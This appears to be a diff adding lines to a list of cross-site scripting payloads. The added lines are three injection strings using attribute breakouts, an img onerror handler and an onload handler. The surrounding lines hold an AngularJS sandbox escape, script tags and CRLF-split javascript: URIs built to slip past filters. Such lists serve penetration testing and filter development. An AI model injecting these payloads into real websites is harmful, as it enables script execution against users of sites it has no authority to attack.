@@ -8,6 +8,10 @@ q=<g><script>alert%28document.domain%29<%2Fscript>
 {{a=toString().constructor.prototype;a.charAt=a.trim;$eval('a,alert(1),a')}}
 ";(a=alert,b=1,a(b))// ( 200 OK )
 <img/src=x onError="`${x}`;alert(`Ex.Mi`);">
+"><U>test123';alert();//
+test 345 <img src=x onerror=alert(2)>
+123" onload=alert();//"test123
+
 
 java%0d%0ascript%0d%0a:alert(0)
 j%0d%0aava%0d%0aas%0d%0acrip%0d%0at%0d%0a:confirm`0`
